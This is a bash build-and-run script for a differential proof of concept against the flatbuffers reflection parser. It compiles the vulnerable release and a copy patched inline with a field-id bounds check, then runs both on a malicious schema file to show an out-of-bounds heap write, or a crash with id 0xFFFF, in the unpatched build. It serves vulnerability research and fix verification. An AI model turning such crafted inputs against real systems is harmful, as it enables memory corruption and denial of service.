#!/usr/bin/env bash
# FlatbufOverrun — build + run the differential PoC against the REAL flatbuffers
# reflection parser (vendored verbatim from v25.12.19-2026-02-06) using zig cc.
#
# 1. Builds the vulnerable binary from src/ (the exact release source).
# 2. Builds a fixed binary from the same source + upstream fix 8a12183.
# 3. Runs both on the identical malicious .bfbs and prints the differential.
set -u
cd "$(dirname "$0")"

ZIG="${ZIG:-/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig}"
CXXFLAGS="-std=c++17 -O1 -DNDEBUG -I include"
mkdir -p build

echo "== [1/4] building VULNERABLE binary (vendored v25.12.19-2026-02-06 src) =="
"$ZIG" c++ $CXXFLAGS poc.cc src/idl_parser.cpp src/reflection.cpp src/util.cpp \
  -o build/poc_vuln || { echo "BUILD FAILED (vulnerable)"; exit 1; }

echo "== [2/4] applying upstream fix 8a12183 to idl_parser.cpp -> build/idl_parser_fixed.cpp =="
python3 - "$PWD" <<'PYEOF'
import sys
base = sys.argv[1]
s = open(base + "/src/idl_parser.cpp").read()
old = ("  auto indexes = std::vector<uoffset_t>(of.size());\n"
       "  for (uoffset_t i = 0; i < of.size(); i++) indexes[of.Get(i)->id()] = i;\n")
new = ("  auto indexes = std::vector<uoffset_t>(of.size());\n"
       "  for (uoffset_t i = 0; i < of.size(); i++) {\n"
       "    uint16_t field_id = of.Get(i)->id();\n"
       "    if (field_id >= of.size()) {\n"
       "      parser.error_ = \"Field ID \" + std::to_string(field_id) +\n"
       "                      \" exceeds field count \" + std::to_string(of.size());\n"
       "      return false;\n"
       "    }\n"
       "    indexes[field_id] = i;\n"
       "  }\n")
assert old in s, "vulnerable pattern not found in src/idl_parser.cpp"
open(base + "/build/idl_parser_fixed.cpp", "w").write(s.replace(old, new, 1))
print("patched OK")
PYEOF

echo "== [3/4] building FIXED binary =="
"$ZIG" c++ $CXXFLAGS poc.cc build/idl_parser_fixed.cpp src/reflection.cpp src/util.cpp \
  -o build/poc_fixed || { echo "BUILD FAILED (fixed)"; exit 1; }

echo
echo "== [4/4] differential run =="
echo "--- VULNERABLE (v25.12.19-2026-02-06) ---"
./build/poc_vuln
echo "vuln exit=$?"
echo
echo "--- VULNERABLE, id=0xFFFF (large OOB write -> SIGSEGV) ---"
./build/poc_vuln --huge
echo
echo "--- FIXED (8a12183) ---"
./build/poc_fixed
echo "fixed exit=$?"
echo
echo "differential: vulnerable build writes one element past the heap vector"
echo "(redzone canary corrupted; id=0xFFFF SIGSEGVs), fixed build rejects the same"
echo "input with 'Field ID 1 exceeds field count 1' and no out-of-bounds write."
exit 0
